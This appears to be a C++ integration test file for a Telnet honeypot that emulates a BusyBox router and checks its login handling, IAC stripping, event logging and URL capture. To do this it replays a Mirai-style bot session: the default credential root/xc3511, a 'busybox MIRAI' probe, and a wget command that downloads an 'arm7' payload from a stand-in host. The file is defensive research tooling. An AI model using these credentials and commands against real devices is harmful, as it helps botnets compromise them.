// End to end tests against a real Telnet server.
//
// The service is started on an ephemeral port and driven with a raw socket,
// the way a bot does: send a login, send a password, read the BusyBox prompt,
// type a command. What is exercised is the whole path, the IAC stripping, the
// auth, the fake shell and the events, not a mock of it.

#include <arapuca/core/config.hpp>
#include <arapuca/core/event_bus.hpp>
#include <arapuca/enrich/geoip.hpp>
#include <arapuca/enrich/mitre_mapper.hpp>
#include <arapuca/ssh/auth_policy.hpp>
#include <arapuca/ssh/vfs.hpp>
#include <arapuca/telnet/busybox.hpp>
#include <arapuca/telnet/telnet_service.hpp>

#include <arpa/inet.h>
#include <gtest/gtest.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <algorithm>
#include <chrono>
#include <cstring>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace {

using arapuca::core::Event;
using arapuca::core::EventBus;
using arapuca::core::EventType;
using namespace std::chrono_literals;

/// A raw TCP client, the bot's end of the conversation.
class RawClient {
public:
    explicit RawClient(std::uint16_t port) : fd_(::socket(AF_INET, SOCK_STREAM, 0)) {
        sockaddr_in address{};
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        ::inet_pton(AF_INET, "127.0.0.1", &address.sin_addr);
        // NOLINTNEXTLINE(cppcoreguidelines-pro-type-reinterpret-cast)
        connected_ = ::connect(fd_, reinterpret_cast<sockaddr*>(&address), sizeof(address)) == 0;
        timeval timeout{};
        timeout.tv_sec = 3;
        (void)::setsockopt(fd_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    }

    RawClient(const RawClient&) = delete;
    RawClient& operator=(const RawClient&) = delete;
    RawClient(RawClient&&) = delete;
    RawClient& operator=(RawClient&&) = delete;

    ~RawClient() {
        if (fd_ >= 0) {
            ::close(fd_);
        }
    }

    [[nodiscard]] bool connected() const {
        return connected_;
    }

    void send(const std::string& text) const {
        (void)::send(fd_, text.data(), text.size(), 0);
    }

    /// Read until the marker appears or the read times out.
    [[nodiscard]] std::string read_until(const std::string& marker) const {
        std::string buffer;
        for (int i = 0; i < 80 && buffer.find(marker) == std::string::npos; ++i) {
            std::array<char, 1024> chunk{};
            const ssize_t got = ::recv(fd_, chunk.data(), chunk.size(), 0);
            if (got <= 0) {
                break;
            }
            buffer.append(chunk.data(), static_cast<std::size_t>(got));
        }
        return buffer;
    }

private:
    int fd_ = -1;
    bool connected_ = false;
};

class TelnetHoneypot {
public:
    TelnetHoneypot() {
        config_.sensor_name = "arapuca-itest";
        config_.telnet.enabled = true;
        config_.telnet.port = 0;  // ephemeral
        config_.telnet.hostname = "router";
        config_.telnet.session_timeout = 5s;
        config_.telnet.max_sessions = 16;
        config_.telnet.max_sessions_per_ip = 8;

        auth_ = arapuca::ssh::AuthPolicy::from_yaml(R"(
credentials:
  - { username: "root", password: "xc3511" }
)");
        filesystem_ = arapuca::ssh::Vfs::from_file(std::string(ARAPUCA_CONFIG_DIR) +
                                                   "/telnet_filesystem.yaml");
        mitre_ = arapuca::enrich::MitreMapper::from_file(std::string(ARAPUCA_CONFIG_DIR) +
                                                         "/mitre.yaml");

        arapuca::telnet::TelnetDependencies deps;
        deps.config = &config_;
        deps.bus = &bus_;
        deps.registry = &registry_;
        deps.auth = &auth_;
        deps.filesystem = &filesystem_;
        deps.mitre = &mitre_;
        deps.geo = &geo_;
        deps.on_capture = [this](arapuca::ssh::CaptureRequest request) {
            const std::lock_guard<std::mutex> lock(capture_mutex_);
            captured_.push_back(std::move(request));
        };

        service_ = std::make_unique<arapuca::telnet::TelnetService>(std::move(deps));
        service_->start();
    }

    TelnetHoneypot(const TelnetHoneypot&) = delete;
    TelnetHoneypot& operator=(const TelnetHoneypot&) = delete;
    TelnetHoneypot(TelnetHoneypot&&) = delete;
    TelnetHoneypot& operator=(TelnetHoneypot&&) = delete;

    ~TelnetHoneypot() {
        service_->stop();
    }

    [[nodiscard]] std::uint16_t port() const {
        return service_->bound_port();
    }

    std::vector<Event> events() {
        std::vector<Event> out;
        for (int i = 0; i < 80; ++i) {
            bus_.consume(out, 256, 25ms);
            if (has(out, EventType::TelnetSessionEnd)) {
                break;
            }
        }
        return out;
    }

    static bool has(const std::vector<Event>& events, EventType type) {
        return std::any_of(events.begin(), events.end(), [type](const Event& event) {
            return event.type == type;
        });
    }

    static std::vector<Event> of_type(const std::vector<Event>& events, EventType type) {
        std::vector<Event> out;
        std::copy_if(
            events.begin(), events.end(), std::back_inserter(out), [type](const Event& event) {
                return event.type == type;
            });
        return out;
    }

    std::vector<arapuca::ssh::CaptureRequest> captured() {
        const std::lock_guard<std::mutex> lock(capture_mutex_);
        return captured_;
    }

private:
    arapuca::core::Config config_;
    EventBus bus_{4096};
    arapuca::ssh::CommandRegistry registry_ = arapuca::telnet::busybox_registry();
    arapuca::ssh::AuthPolicy auth_;
    arapuca::ssh::Vfs filesystem_;
    arapuca::enrich::MitreMapper mitre_;
    arapuca::enrich::GeoIp geo_;
    std::unique_ptr<arapuca::telnet::TelnetService> service_;

    std::mutex capture_mutex_;
    std::vector<arapuca::ssh::CaptureRequest> captured_;
};

TEST(TelnetServer, AcceptsAWeakCredentialAndDropsIntoBusybox) {
    TelnetHoneypot honeypot;
    const RawClient client(honeypot.port());
    ASSERT_TRUE(client.connected());

    EXPECT_NE(client.read_until("login: ").find("router login: "), std::string::npos);
    client.send("root\r\n");
    EXPECT_NE(client.read_until("Password: ").find("Password: "), std::string::npos);
    client.send("xc3511\r\n");

    const std::string shell = client.read_until("# ");
    EXPECT_NE(shell.find("BusyBox"), std::string::npos);

    client.send("/bin/busybox MIRAI\r\n");
    const std::string probe = client.read_until("# ");
    EXPECT_NE(probe.find("MIRAI: applet not found"), std::string::npos);

    client.send("exit\r\n");

    const auto events = honeypot.events();
    EXPECT_TRUE(TelnetHoneypot::has(events, EventType::TelnetSessionStart));
    EXPECT_TRUE(TelnetHoneypot::has(events, EventType::TelnetAuthAttempt));
    EXPECT_TRUE(TelnetHoneypot::has(events, EventType::TelnetCommand));
    EXPECT_TRUE(TelnetHoneypot::has(events, EventType::TelnetSessionEnd));

    const auto auths = TelnetHoneypot::of_type(events, EventType::TelnetAuthAttempt);
    ASSERT_FALSE(auths.empty());
    EXPECT_TRUE(auths.front().detail.at("accepted").get<bool>());
}

TEST(TelnetServer, RefusesAnUnknownCredential) {
    const TelnetHoneypot honeypot;
    const RawClient client(honeypot.port());
    ASSERT_TRUE(client.connected());

    (void)client.read_until("login: ");
    client.send("admin\r\n");
    (void)client.read_until("Password: ");
    client.send("not-the-password\r\n");

    // A refused login is told so and asked again.
    const std::string again = client.read_until("login: ");
    EXPECT_NE(again.find("Login incorrect"), std::string::npos);
}

TEST(TelnetServer, StripsIacNegotiationFromTheLogin) {
    const TelnetHoneypot honeypot;
    const RawClient client(honeypot.port());
    ASSERT_TRUE(client.connected());

    (void)client.read_until("login: ");
    // A real client opens with negotiation. IAC WILL NAWS, then the username.
    std::string login;
    login.push_back(static_cast<char>(255));  // IAC
    login.push_back(static_cast<char>(251));  // WILL
    login.push_back(static_cast<char>(31));   // NAWS
    login += "root\r\n";
    client.send(login);
    (void)client.read_until("Password: ");
    client.send("xc3511\r\n");

    // The negotiation bytes must not have corrupted the username, so the login
    // is accepted.
    const std::string shell = client.read_until("# ");
    EXPECT_NE(shell.find("BusyBox"), std::string::npos);
}

TEST(TelnetServer, CapturesADownloadUrl) {
    TelnetHoneypot honeypot;
    const RawClient client(honeypot.port());
    ASSERT_TRUE(client.connected());

    (void)client.read_until("login: ");
    client.send("root\r\n");
    (void)client.read_until("Password: ");
    client.send("xc3511\r\n");
    (void)client.read_until("# ");
    client.send("cd /tmp; wget http://203.0.113.9/arm7\r\n");
    (void)client.read_until("# ");
    client.send("exit\r\n");

    (void)honeypot.events();  // let the session finish and the capture queue
    const auto captured = honeypot.captured();
    ASSERT_FALSE(captured.empty());
    EXPECT_EQ(captured.front().url, "http://203.0.113.9/arm7");
}

}  // namespace
